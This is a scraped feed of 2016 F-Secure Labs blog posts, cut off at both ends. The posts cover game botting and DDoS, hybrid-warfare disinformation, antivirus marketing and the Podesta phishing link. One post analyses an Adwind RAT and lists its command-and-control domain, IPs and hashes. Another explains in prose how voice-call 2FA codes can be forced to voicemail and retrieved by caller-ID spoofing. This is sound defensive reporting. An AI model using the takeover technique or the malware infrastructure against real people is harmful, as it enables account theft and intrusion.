/>",https://labsblog.f-secure.com/2016/12/21/whats-the-deal-with-digital-forensics-incident-response-and-attribution/
"On Botting, Cheating, And DDoSers","<p>On November 10th 2016 <a href=""http://us.battle.net/forums/en/wow/topic/20752045247"" target=""_blank"">Blizzard enacted a &#8220;ban wave&#8221;</a> on thousands of World of Warcraft accounts for &#8220;botting&#8221;, a term widely used to describe using third party programs to automate gameplay. Technically it wasn&#8217;t a &#8220;ban wave&#8221; &#8211; the accounts in question received between 6 and 24 month suspensions based on how often they&#8217;d been caught botting in the past. This is the first action they&#8217;ve taken on cheating since the August 30th release of the latest expansion, Legion.</p>
<p>Bots in World of Warcraft are used for a variety of cheats, all of which impact legitimate players fairly heavily. What might surprise you is that botting, and cheating in general, is extremely common. Left unchecked, it can proliferate to the point of ruining an entire franchise.</p>
<p>Diablo 3, another game published by Blizzard entertainment, was, for all intents and purposes, destroyed by botting. During 2015 it became apparent that a large percentage of the player base were botting their characters. Even some high-profile &#8220;celebrity&#8221; streamers were known to bot &#8220;off camera&#8221;. One streamer, who&#8217;s account averaged over 22 hours gameplay per day since the launch of the game&#8217;s &#8220;Seasons&#8221; mode explained that his brother &#8220;Chris&#8221; was playing on his account when he wasn&#8217;t. He was eventually caught, and lost his account, only to immediately buy a new one and continue to bot. To this day, bots are still often referred to as &#8220;Brother Chris&#8221;.</p>
<p>In another example of just how widespread the problem was, <a href=""https://www.youtube.com/watch?v=x2oURqiWxTs"" target=""_blank"">here&#8217;s a video</a> of one player who forgot to shut off his stream before starting his bot software and leaving it running, all night, for the world to see. At the time, he was one of very few people to actually lose their accounts.</p>
<div class=""wp-caption alignnone"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2016/12/honor-buddy.png""><img alt=""A multi-bot setup"" height=""576"" src=""https://newsfromthelab.files.wordpress.com/2016/12/honor-buddy.png?w=1024&#038;h=576"" width=""1024"" /></a><p class=""wp-caption-text"">A WoW bot farm in action. (Source: <a href=""https://wowbotfarm.wordpress.com"" target=""_blank"">https://wowbotfarm.wordpress.com</a>)</p></div>
<p>Botting in Diablo 3 went unchecked for so long that many players came to the conclusion that there would never be any repercussions for doing it. This empowered more and more players to follow suit and start cheating. The snowball effect grew to the point where it was estimated that way more than half of all players were botting and using other cheat software. As cheating went from niche to mainstream, it became a de facto requirement for playing the game competitively. The problem was so bad that several high-profile Diablo 3 players got together and <a href=""http://us.battle.net/forums/en/d3/topic/19288210069"" target=""_blank"">wrote an open letter to Blizzard</a>. Although Blizzard acknowledged this letter shortly after it was posted, botting continued unabated for months later.</p>
<p>A well-known streamer, <a href=""https://www.twitch.tv/mannercookie"" target=""_blank"">MannerCookie</a>, posted <a href=""https://www.youtube.com/watch?v=XRC6ylnKOhY"" target=""_blank"">this video on youtube</a> showing what bots are capable of. If you&#8217;ve never seen a bot in action, I recommend watching the video &#8211; it&#8217;s quite astonishing how sophisticated they are. What&#8217;s sad is that MannerCookie actually received an account ban for making this public service announcement.</p>
<p>Blizzard eventually enacted a ban wave in Diablo 3, but long after I, and all of my friends, had given up on the game. I&#8217;m pretty sure Blizzard were stuck between a rock and a hard place on the bot issue. Ban all the bots and you lose more than half of your player base. Don&#8217;t ban them, and you slowly lose regular players, trust, and legitimacy. The fact is, the problem shouldn&#8217;t have persisted, unchecked, for as long as it did.</p>
<p>With Blizzard enacting ban waves on an infrequent, almost regular-as-clockwork basis, most botters simply buy new accounts and continue where they left off. Last night, just hours after the ban wave, I spotted several bots in World of Warcraft, happily doing what they&#8217;ve always being doing. I reported them, but I wouldn’t be surprised to see them over and over again.</p>
<p>Visiting the forums used by botters after a ban wave gives me insight into the psyche of these folks. What&#8217;s obvious is that many of them feel incredibly entitled. They claim it&#8217;s their right to bot. I saw one kid go ballistic about the fact that he didn&#8217;t have time to play all of his eleven, yes, count them, eleven different Warcraft accounts without the use of a bot. He went on to state, in no uncertain terms, that he was going to sue Blizzard for the action they had taken on his accounts (which, of course, I’m sure he didn’t).</p>
<p>Given that cheating is surprisingly widespread, and to many, perfectly acceptable, an entire culture of self-entitled habitual video game cheaters has sprung up. In these social circles, cheating at video games is just the first step on a path that leads to even more anti-social behavior. More often than not, these same self-entitled kids, once caught in the act of breaking terms of service, will lash back at Blizzard with DDoS attacks sourced from the same readily available services of the folks <a href=""http://www.huffingtonpost.co.uk/andy-patel/why-were-all-indirectly-c_b_12249134.html"" target=""_blank"">I talked about in my last post</a>. Every time Blizzard swings the ban hammer, they know they’ll need to brace for DDoS attacks. And those attacks affect everyone using Blizzard’s services. This cesspool of low moral ethics hurts legitimate gamers, the games they’re playing, and games companies themselves. And companies like Blizzard need to spend significant resources on cheat detection and DDoS prevention just to keep on top of all of this.</p>
<p>Often parents ask us what their kids are getting up to in the Internet that they don&#8217;t know about. This might just be one of those things.</p>
<hr />
<p><em>This article was originally published on <a href=""http://www.huffingtonpost.co.uk/andy-patel/how-brother-chris-is-slow_b_13007254.html"" target=""_blank"">Huffpost Tech UK</a>.</em></p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/ddos/"">DDoS</a>, <a href=""https://labsblog.f-secure.com/tags/kyb3r/"">Kyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/script-kiddies/"">Script Kiddies</a>, <a href=""https://labsblog.f-secure.com/tags/wow/"">WoW</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2253&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2016/12/07/on-botting-cheating-and-ddosers/
A Joint Centre To Combat Hybrid Warfare Threats,"<p>Helsinki will host a new centre focused on curbing the growing threat of hybrid warfare <a href=""http://yle.fi/uutiset/osasto/news/helsinki_to_host_hub_aimed_at_curbing_cyber_warfare_threats/9307244"" target=""_blank"">according to recent reports</a>. Disinformation and fake news is considered &#8220;hybrid warfare&#8221; in this context.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/11/yle-uutiset-2016-11-21.png""><img alt=""YLE Uutiset 2016-11-21"" class=""alignnone wp-image-2232 size-full"" height=""180"" src=""https://newsfromthelab.files.wordpress.com/2016/11/yle-uutiset-2016-11-21.png?w=590&#038;h=180"" style=""border: 1px solid #000000;"" width=""590"" /></a></p>
<p>The proposed annual budget is reportedly estimated at two million euros.</p>
<p>I think… they&#8217;re gonna need a bigger boat.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/11/youre-gonna-need-a-bigger-boat.gif""><img alt=""You're gonna need a bigger boat"" class=""alignnone wp-image-2234 size-full"" height=""315"" src=""https://newsfromthelab.files.wordpress.com/2016/11/youre-gonna-need-a-bigger-boat.gif?w=630&#038;h=315"" style=""border: 1px solid #000000;"" width=""630"" /></a></p>
<p>Fighting against hybrid warfare disinformation will be extremely challenging in today&#8217;s media landscape. Disinformation for profit, a.k.a. content farming, as well as good old fashioned <a href=""https://en.wikipedia.org/wiki/Misinformation"" target=""_blank"">misinformation</a>, coupled with the average individual&#8217;s inability to make any real critical distinctions, provides a huge amount of cover for politically motivated disinformation.</p>
<p>And how bad is the average individual&#8217;s ability to tell real news from fake? Stanford researchers recently evaluated students&#8217; ability and described the results as…&#8221;bleak&#8221;.</p>
<p><a href=""http://www.npr.org/sections/thetwo-way/2016/11/23/503129818/study-finds-students-have-dismaying-inability-to-tell-fake-news-from-real"" target=""_blank"">From NPR</a>.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/11/npr-2016-11-23.png""><img alt=""NPR 2016-11-23"" class=""alignnone wp-image-2231 size-full"" height=""210"" src=""https://newsfromthelab.files.wordpress.com/2016/11/npr-2016-11-23.png?w=670&#038;h=210"" style=""border: 1px solid #000000;"" width=""670"" /></a></p>
<p>It&#8217;s a surprise to me that researchers would be shocked but the results of their study – but then, I spent a many, many months studying cost-per-action social media spam on Facebook years ago. Fraudulent links using supposedly scandalous video bait of one sort or another spread rapidly, and millions upon millions of people clicked the links. Repeatedly. Why would scandalous &#8220;news&#8221; be any different?</p>
<p><a href=""http://www.edweek.org/ew/articles/2016/11/02/why-students-cant-google-their-way-to.html"" target=""_blank"">Is education the answer</a>?</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/11/education-week-2016-11-01.png""><img alt=""Education Week 2016-11-01"" class=""alignnone wp-image-2230 size-full"" height=""230"" src=""https://newsfromthelab.files.wordpress.com/2016/11/education-week-2016-11-01.png?w=620&#038;h=230"" style=""border: 1px solid #000000;"" width=""620"" /></a></p>
<p>I&#8217;m never against a good education. But it&#8217;s not going to fix the problem.</p>
<p>As long as media continues to hunt for &#8220;viral content&#8221; in its increasingly desperate search for advertising revenues – disinformation and misinformation will continue to exist and flourish. And as long as it does, there will be able ample enough cover to provide political actors plausible deniability.</p>
<p>The new Helsinki joint centre has its work cut out for it.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/disinformation/"">Disinformation</a>, <a href=""https://labsblog.f-secure.com/tags/kyb3r/"">Kyb3r</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2233&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2016/11/24/a-joint-centre-to-combat-hybrid-warfare-threats/
Yahoo! Voice Call 2FA Fail,"<p>Netflix recently fixed <a href=""https://slashcrypto.org/2016/11/07/Netflix/"" target=""_blank"">an account takeover vulnerability</a> involving automated phone calls and caller ID spoofing. The issue? An attacker could use Netflix&#8217;s &#8220;forgot email/password&#8221; feature to reset an account&#8217;s password by directing the reset code to a voice call. In order to force the code to voice mail, the attacker would need to call the account holder&#8217;s phone at the same time, and then, the code could be retrieved from the account holder&#8217;s voicemail via caller ID spoofing (which something that many operators are vulnerable to even though it&#8217;s 2016).</p>
<div class=""wp-caption alignnone"" id=""attachment_2211"" style=""width: 870px;""><a href=""https://newsfromthelab.files.wordpress.com/2016/11/netflix-reset.jpg""><img alt=""Netflix: Forgot Email/Password"" class=""wp-image-2211 size-full"" height=""520"" src=""https://newsfromthelab.files.wordpress.com/2016/11/netflix-reset.jpg?w=860&#038;h=520"" width=""860"" /></a><p class=""wp-caption-text"">Netflix: Forgot Email/Password</p></div>
<p>Netflix has now adjusted its system to wait for input before providing the reset code. No input, no code. So nothing just rolls into voicemail anymore.</p>
<p>Waiting for input is how Microsoft&#8217;s Office sign in works with its &#8220;call me&#8221; verification.</p>
<div class=""wp-caption alignnone"" id=""attachment_2212"" style=""width: 870px;""><a href=""https://newsfromthelab.files.wordpress.com/2016/11/office-365.jpg""><img alt=""Office 365 MFA Options"" class=""wp-image-2212 size-full"" height=""520"" src=""https://newsfromthelab.files.wordpress.com/2016/11/office-365.jpg?w=860&#038;h=520"" style=""border: 1px solid #000000;"" width=""860"" /></a><p class=""wp-caption-text"">Microsoft Office Sign In</p></div>
<p>The automated call agent prompts the account holder to input the pound/hash/number sign (#), and then, once the recipient does so, the sign in is completed.</p>
<p>And then… there&#8217;s an organization which was recently in the news because <a href=""https://yahoo.tumblr.com/post/150781911849/an-important-message-about-yahoo-user-security"" target=""_blank"">hundreds of millions of account passwords were compromised</a>. Yahoo!</p>
<div class=""wp-caption alignnone"" id=""attachment_2213"" style=""width: 870px;""><a href=""https://newsfromthelab.files.wordpress.com/2016/11/yahoo.jpg""><img alt=""Yahoo! MFA Options"" class=""wp-image-2213 size-full"" height=""520"" src=""https://newsfromthelab.files.wordpress.com/2016/11/yahoo.jpg?w=860&#038;h=520"" style=""border: 1px solid #000000;"" width=""860"" /></a><p class=""wp-caption-text"">&#8220;Call with the code&#8221;</p></div>
<p>Unfortunately, Yahoo&#8217;s multi-factor authentication &#8220;call with the code&#8221; feature is not interactive. It just calls with a one-time code. And so, Yahoo currently suffers from the same vulnerability as Netflix did. An attacker can force such codes to voicemail. And as there are so many compromised passwords in-the-wild… this is a problem.</p>
<p>Here&#8217;s <a href=""https://twitter.com/FSLabs/status/798881544895086592"" target=""_blank"">a demonstration</a> that <a href=""https://twitter.com/r0zetta"" target=""_blank"">Andy</a> and I recorded.</p>
<p>Via Twitter.</p>
<div class=""embed-twitter"">
<blockquote class=""twitter-tweet"">
<p dir=""ltr"" lang=""en"">Office 365 vs. Yahoo! MFA – who will win?!? (Go on, take a wild guess…) <a href=""https://t.co/TMl3mPSIZ5"">pic.twitter.com/TMl3mPSIZ5</a></p>
<p>&mdash; News from the Lab (@FSLabs) <a href=""https://twitter.com/FSLabs/status/798881544895086592"">November 16, 2016</a></p></blockquote>
<p></div>
<p>Embedded audio.</p>
<!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
<audio class=""wp-audio-shortcode"" controls=""controls"" id=""audio-2214-1"" preload=""none"" style=""width: 100%;""><source src=""https://newsfromthelab.files.wordpress.com/2016/11/testing-office-365-yahoo-mfa.mp3?_=1"" type=""audio/mpeg"" /><a href=""https://newsfromthelab.files.wordpress.com/2016/11/testing-office-365-yahoo-mfa.mp3"">https://newsfromthelab.files.wordpress.com/2016/11/testing-office-365-yahoo-mfa.mp3</a></audio><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/2fa/"">2FA</a>, <a href=""https://labsblog.f-secure.com/tags/kyb3r/"">Kyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/mfa/"">MFA</a>, <a href=""https://labsblog.f-secure.com/tags/passwords/"">Passwords</a>, <a href=""https://labsblog.f-secure.com/tags/vulnerability/"">Vulnerability</a>, <a href=""https://labsblog.f-secure.com/tags/yahoo/"">Yahoo</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2214&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2016/11/17/yahoo-voice-call-2fa-fail/
What’s The Deal With “Next Gen”?,"<p>We&#8217;re frequently asked about &#8220;Next Gen&#8221; antivirus companies, which is not surprising. They&#8217;ve been making a lot of noise and bold claims during the last couple of years (so, basically, since they were founded). So let&#8217;s take a look at what they&#8217;re all about.</p>
<h2>Coopetition in the AV industry</h2>
<p>But before getting into what &#8220;Next Gen&#8221; are up to, let&#8217;s take a brief stroll down memory lane. During the past three decades, vendors in the Endpoint Protection industry have adopted a system of &#8220;coopetition&#8221;, where vendors compete fiercely on the sales front while their analysts, developers, and engineers share information and cooperate for the greater good of cyber security. This cooperative competition has included sharing knowledge (through conferences and events), sharing samples, sharing threat intelligence, and agreeing on certain standards.</p>
<p>A few examples of this. In June 2004, <a href=""https://www.virustotal.com/en/about/"" target=""_blank"">VirusTotal</a> was founded as a service for the industry to cooperate on the sharing of samples and verdicts. This service now facilitates the sharing of approximately half a billion samples daily, includes over fifty products, and is a great source of threat intelligence for many in the industry.</p>
<p>Here&#8217;s another example. Independent testing organizations, whose mandate was to ensure that products were actually providing the protection they claimed, were formed. It makes sense to hand this task to a set of independent organizations – consumers and businesses just don&#8217;t have the time, resources, or expertise to work with live malware, find freshly exploited sites, and conduct tests against dozens of different products just to make a decision about which solution they&#8217;ll purchase. I find it astonishing that some &#8220;next gen&#8221; companies actually recommend that the public perform their own AV testing. Anyways, in 2008, the <a href=""http://www.amtso.org/"" target=""_blank"">Anti-Malware Testing Standards Organization (AMTSO™)</a> was founded to facilitate just this.</p>
<p>This cooperative spirit didn&#8217;t just happen overnight – it&#8217;s been a slow and gradual process. In the old days, there was plenty more competition and rivalry between cyber security companies.</p>
<h3>How to alienate yourself from Virus Total</h3>
<p>But things changed a few years ago. Instead of joining the community, many of the &#8220;Next Gen&#8221; players (to be clear here, we&#8217;re talking about &#8220;Next Gen Endpoint Security&#8221;, or &#8220;antivirus&#8221; vendors, not EDR or breach detection products) took an altogether different route. They launched marketing campaigns designed to discredit incumbent security vendors by insinuating that their products are based on &#8220;signature-only&#8221; technologies.</p>
<p>The &#8220;data&#8221; that &#8220;Next Gen&#8221; vendors often rely on to present this argument is flawed. It&#8217;s based on comparing their full technology stack to competitor results from VirusTotal (which only test static file scanning capabilities). Despite the fact that Virus Total changed their policies regarding the use of their data after noticing these campaigns, &#8220;Next Gen&#8221; are still up to it. And it&#8217;s certainly provocative.</p>
<h3>Welcome to the Big AV conspiracy</h3>
<p>What might have led them to do this? It seems that some &#8220;Next Gen&#8221; companies claim that they&#8217;re unable to compete in an industry that is controlled by what they refer to as &#8220;Big AV&#8221;. Akin to stories of the Illuminati, they insinuate that a shadowy cabal of established InfoSec companies control the industry and are working to undermine their credibility.</p>
<div class=""wp-caption alignnone"" id=""attachment_1871"" style=""width: 610px;""><a href=""https://newsfromthelab.files.wordpress.com/2016/07/big-av.jpg""><img alt=""Big-AV"" class=""size-full wp-image-1871"" height=""450"" src=""https://newsfromthelab.files.wordpress.com/2016/07/big-av.jpg?w=600&#038;h=450"" width=""600"" /></a><p class=""wp-caption-text"">A picture from the last annual general meeting of Big AV. That&#8217;s me on the right. (Source: <a href=""http://yournewswire.com/"" rel=""nofollow"">http://yournewswire.com/</a>)</p></div>
<h3>When in doubt, blame QA</h3>
<p>Just recently, &#8220;Next Gen&#8221; have turned their inaccurate marketing assault towards the independent AV testing industry. Numerous claims have been made insinuating that the independent AV testing industry is untrustworthy, biased, and paid-for.</p>
<p>We agree that independent testing methodologies aren&#8217;t perfect, and perhaps they haven&#8217;t evolved as fast as the technologies and threat landscape around them have. Not every technology in our own products factors into the tests they run. But the industry certainly isn&#8217;t rigged in favor of certain types of products or vendors.</p>
<p>Our main motivation behind working with independent testing organizations is to acquire valuable quality assurance data for our products and technologies. Testing organizations build and maintain complex infrastructure designed to search for the absolute latest threats in the wild, in an attempt to trip up the best endpoint protection technologies. We source multiple private tests every month and use the data from those tests to constantly improve our technologies and services. These organizations don&#8217;t exist to tell us our products are good – if they were, we&#8217;d find little value in utilizing their services.</p>
<p>Many &#8220;Next Gen&#8221; companies refuse to participate in independent testing – public or private. In fact, some “Next Gen” vendors go to great lengths to avoid having their products independently evaluated – they specifically refrain from selling their products to testing labs, and may even revoke a license key – without a refund – if they find out or suspect that it was bought anonymously by a testing lab.</p>
<h3>Why do the work when you can get others to do it for you?</h3>
<p>As I&#8217;ve said in the past, &#8220;Traditional AV&#8221; versus &#8220;Next Gen&#8221; is a concept that was coined by &#8220;Next Gen&#8221; marketing departments. And here&#8217;s why. Instead of investing resources into the technologies and infrastructure required by all other independent security companies, many &#8220;Next Gen&#8221; vendors outsource a lot of that work to third parties (often the very companies they&#8217;re calling &#8220;Traditional AV&#8221;). This outsourcing can include licensing feeds of verdicts from third parties (which are generated by, you guessed it, &#8220;Traditional AV&#8221; products) or even running competitor products in their own back end infrastructure.</p>
<p>We see about 500,000 new samples every day, and to analyze and categorize those samples, we&#8217;ve invested heavily into infrastructure, storage, and automation. Building and improving that infrastructure took over a dozen years. Without this infrastructure and the constant improvements we put into back end systems, sample analysis automation, and sample storage and categorization, we&#8217;d simply not be able to stay ahead of the threat landscape. Technologies are one thing, but they&#8217;re only as good as the rules, logic, samples, and metadata they&#8217;re fed. Which, in turn, relies heavily on providing relevant inputs. And those inputs have to come from somewhere.</p>
<h3>Venture capital buys a lot of marketing</h3>
<p>The money saved from skimping on proper data collection and infrastructure is funneled directly into &#8220;Next Gen&#8221; marketing departments. Equipped with these huge venture capital-backed marketing budgets, they&#8217;ve bombarded the press with the idea of &#8220;Traditional AV&#8221; versus &#8220;Next Gen&#8221;, spread mistruths that incumbent AV products are &#8220;signature only&#8221;, created bad press around independent testing organizations, and are probably working on new propaganda we haven&#8217;t seen yet.</p>
<p>It&#8217;s important to note that the term &#8220;Next Gen&#8221; has already seen widespread adoption in the industry, which is a shame, since it&#8217;s obviously biased. &#8220;Next Gen&#8221; implies newer and better, a notion that&#8217;s far from the truth. A more accurate and fair term would be &#8220;Anti Virus startup&#8221;.</p>
<p>If you want to know how you&#8217;re being protected, you&#8217;re going to have a hard time figuring out how most &#8220;Next Gen&#8221; products work; their blog posts and white papers are mostly just a string of marketing buzzwords. In many cases, their products are difficult to get hold of – you can&#8217;t simply buy a license and go download the installer. They claim it&#8217;s because they don&#8217;t want their intellectual property stolen. We have a term for that – security through obscurity.</p>
<h3>What&#8217;s so &#8220;Next Gen&#8221; about ten year old ideas?</h3>
<p>The fact is, all endpoint protection solutions use similar approaches (and again, I&#8217;m comparing all endpoint protection products here, not breach detection solutions, which are a <a href=""https://www.f-secure.com/en/web/business_global/rapid-detection-service"">totally different beast</a>). Some products emphasize certain technologies or strategies more heavily than others. And although the technologies that are being dubbed &#8220;Next Gen&#8221; have been around for at least a decade, and were originally conceived and developed by &#8220;Traditional AV&#8221; vendors, &#8220;Next Gen&#8221; players are applying these technologies in their own way, and are doing a great job at it. <a href=""https://labsblog.f-secure.com/2016/10/17/whats-the-deal-with-non-signature-based-anti-malware-solutions/"">Maybe by their own logic, we&#8217;re all &#8220;Next Gen&#8221;?</a></p>
<p>The fact is, &#8220;Next Gen&#8221; or not, these products are designed to protect endpoint systems against malicious attacks. And that&#8217;s great. Competition is good. Innovation is good. Attacking an old problem from a new angle is always welcome. It&#8217;s a positive thing for the industry that there&#8217;s a bunch of new players in the field. And they&#8217;ve done a great job at getting the word out to the general public that threats exist and protection is needed, especially with the growth we&#8217;ve seen in the cyber-crime industry and with targeted attacks becoming ever more widespread.</p>
<p>I&#8217;m not sure why &#8220;Next Gen&#8221; took it upon themselves to start out by fighting the industry. Regardless of their reasons, it&#8217;s not too late to change. I&#8217;d personally prefer we sit down, have a beer or three, share ideas, share data, and talk about how we can work together to make things safer and more secure for everyone.</p>
<p>Agree? Disagree? Tell me your opinion <a href=""https://twitter.com/r0zetta"" target=""_blank"">on Twitter</a>!</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/bigav/"">BigAV</a>, <a href=""https://labsblog.f-secure.com/tags/explainer/"">Explainer</a>, <a href=""https://labsblog.f-secure.com/tags/kyb3r/"">Kyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/next-gen/"">Next Gen</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=1869&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2016/11/16/whats-the-deal-with-next-gen/
A RAT For The US Presidential Elections,"<p>A day before the controversial United States Presidential elections, an email was distributed to inform the recipients of a possible attack during election day as mentioned in a manifesto, allegedly from the ISIS terrorist group, entitled &#8220;The Murtadd Vote&#8221;. The email was supposedly sent by the head of a US-based terrorist monitoring group. The message was a snippet from the article of <a href=""http://www.usatoday.com/story/news/2016/11/05/islamic-state-calls-attacks-election-day-voters/93352238/"">USA Today</a>, and has a ZIP archive called &#8220;The Murtadd Vote.zip&#8221;.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/11/mail1.png""><img alt=""mail"" class=""alignnone wp-image-2186 size-full"" height=""668"" src=""https://newsfromthelab.files.wordpress.com/2016/11/mail1.png?w=745&#038;h=668"" style=""border: 1px solid #000000;"" width=""745"" /></a></p>
<p>The attachment extracts to &#8220;The Murtadd Vote.jar&#8221;, which is an Adwind Remote Access Tool/trojan (RAT). Adwind RAT (or jRAT) is nothing novel. In fact, it has been available as a Malware-as-a-Service subscription for already 4 years now. The RAT is capable of keylogging, credential-stealing, and downloading and executing additional files on the infected host to name a few features.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/11/manifest.png""><img alt=""manifest"" class=""alignnone wp-image-2177 size-full"" height=""451"" src=""https://newsfromthelab.files.wordpress.com/2016/11/manifest.png?w=645&#038;h=451"" style=""border: 1px solid #000000;"" width=""645"" /></a></p>
<p>What makes this threat slightly different from other RATs? It&#8217;s platform-independent, and so it runs basically on any device with Java Runtime Environment (JRE) installed. As seen below, the malware was able to successfully install a copy of itself as evgjyuBYuAY.WyhMVR in both Windows and Linux.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/11/windows_linux.png""><img alt=""windows_linux"" class=""alignnone size-full wp-image-2196"" height=""519"" src=""https://newsfromthelab.files.wordpress.com/2016/11/windows_linux.png?w=549&#038;h=519"" width=""549"" /></a></p>
<p>This particular sample phones home to invoicesheet[.]ddns[.]net:183, which resolved to 163.47.20.25 yesterday, and today to 103.25.58.83.</p>
<p>In Windows, it uses a VBS script to search for machine information, such as which firewall is being used. It writes onto the registries using a .REG file, and has the ability to disable UAC and kill several processes that are related to system monitoring, antivirus products, and debugging software.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/11/regentries.png""><img alt=""regentries"" class=""alignnone size-full wp-image-2178"" height=""692"" src=""https://newsfromthelab.files.wordpress.com/2016/11/regentries.png?w=1024&#038;h=692"" width=""1024"" /></a></p>
<p>IOCs:</p>
<ul>
<li>80b83ff63adce9ee3ef593ef92eb6fb8eebe431d</li>
<li>f9143d7ff3d7651155e7164093722d2eba25bd13 (DeepGuard Kavala.O)</li>
<li>dc4a1fdbaad15ddd6fe22d3907c6b03727b71510</li>
<li>8a50c72b4580c20d4a7bfc7af8f12671bf6715ae</li>
<li>invoicesheet.ddns.net</li>
<li>163.47.20.25</li>
<li>103.25.58.83</li>
</ul><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/kyb3r/"">Kyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/rat/"">RAT</a>, <a href=""https://labsblog.f-secure.com/tags/trojan/"">Trojan</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2174&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2016/11/10/a-rat-for-the-us-presidential-elections/
How To Vet URL Shorteners #2016CampaignEdition,"<p>John Podesta, the Chairman of Hillary Clinton&#8217;s 2016 presidential campaign, allowed his Gmail account to be compromised in March 2016. And as a consequence, <a href=""https://en.wikipedia.org/wiki/Podesta_emails"" target=""_blank"">his correspondence has been in the news</a> throughout the month of October.</p>
<p>Recently, the March 2016 phishing message itself was published.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/10/john-podesta-phishing-message.png""><img alt=""John Podesta Phishing Message"" class=""alignnone wp-image-2156 size-full"" height=""760"" src=""https://newsfromthelab.files.wordpress.com/2016/10/john-podesta-phishing-message.png?w=760&#038;h=760"" style=""border: 1px solid #000000;"" width=""760"" /></a></p>
<p>Do you notice anything odd about the message?</p>
<p>The very first thing that jumps out at me is this: WTF is a Bitly link doing there in what&#8217;s supposed to be a message from Google? Apparently, Podesta&#8217;s <a href=""http://www.vox.com/policy-and-politics/2016/10/28/13456368/how-john-podesta-email-got-hacked"" target=""_blank"">IT guy failed</a> to flag this message as suspicious when he asked about it. A &#8220;support message&#8221; with a short link should always, always equal a big red flag.</p>
<p>Because first of all, to the best of my knowledge, Google support doesn&#8217;t use a URL shortener. And second, even if it did, it would undoubtedly use Google&#8217;s own URL shortener service at <a href=""http://goo.gl/"" target=""_blank"">goo.gl</a> (and not bit.ly).</p>
<p>But the real tragedy of the situation is this… it&#8217;s very easy to check bit.ly and goo.gl short links. All one needs to do is to add a &#8220;+&#8221; to the end of the URL. Adding a plus character to the link in the Podesta phishing message (bit.ly/1PibSU0+) yields this information from bitly.com.</p>
<div class=""wp-caption alignnone"" id=""attachment_2154"" style=""width: 1034px;""><a href=""https://newsfromthelab.files.wordpress.com/2016/10/john-podesta-bitly.png""><img alt=""John Podesta Phishing, Bitly URL Info"" class=""wp-image-2154 size-full"" height=""427"" src=""https://newsfromthelab.files.wordpress.com/2016/10/john-podesta-bitly.png?w=1024&#038;h=427"" style=""border: 1px solid #000000;"" width=""1024"" /></a><p class=""wp-caption-text"">com-securitysettingpage.tk</p></div>
<p>A Google account page located on the .tk TLD? No. At this point, anybody should be able to determine it&#8217;s a trap.</p>
<p>Also, 2 clicks?</p>
<p>Both of them from the USA. Once by the IT guy and once by Podesta? Not a whole lot of vetting going on here, evidently.</p>
<p>Amusingly, part of the phishing site can still be viewed via Google Cache.</p>
<p><a href=""https://newsfromthelab.files.wordpress.com/2016/10/john-podesta-google-cache.png""><img alt=""John Podesta Phishing, Google Cache"" class=""alignnone wp-image-2155 size-full"" height=""600"" src=""https://newsfromthelab.files.wordpress.com/2016/10/john-podesta-google-cache.png?w=960&#038;h=600"" style=""border: 1px solid #000000;"" width=""960"" /></a></p>
<p>It&#8217;s a copy of John Podesta&#8217;s Wikipedia Page.</p><br /> Tagged: <a href=""https://labsblog.f-secure.com/tags/kyb3r/"">Kyb3r</a>, <a href=""https://labsblog.f-secure.com/tags/phishing/"">Phishing</a>, <a href=""https://labsblog.f-secure.com/tags/url-shortener/"">URL Shortener</a> <img alt="""" border=""0"" height=""1"" src=""https://pixel.wp.com/b.gif?host=labsblog.f-secure.com&#038;blog=96573572&#038;post=2157&#038;subd=newsfromthelab&#038;ref=&#038;feed=1"" width=""1"" />",https://labsblog.f-secure.com/2016/10/31/how-to-vet-url-shorteners-2016campaignedition/
CSS Disclosure: tar Extract Pathname Bypass,"<p><a href=""https://twitter.com/hashtag/t2infosec"" target=""_blank"">T2&#8217;16 Infosec Conference</a> kicked off this morning in Helsinki. And to celebrate this, F-Secure CSS security consultant Harry Sintonen has a vulnerability disclosure to publish.</p>
<p>See below for more info.</p>
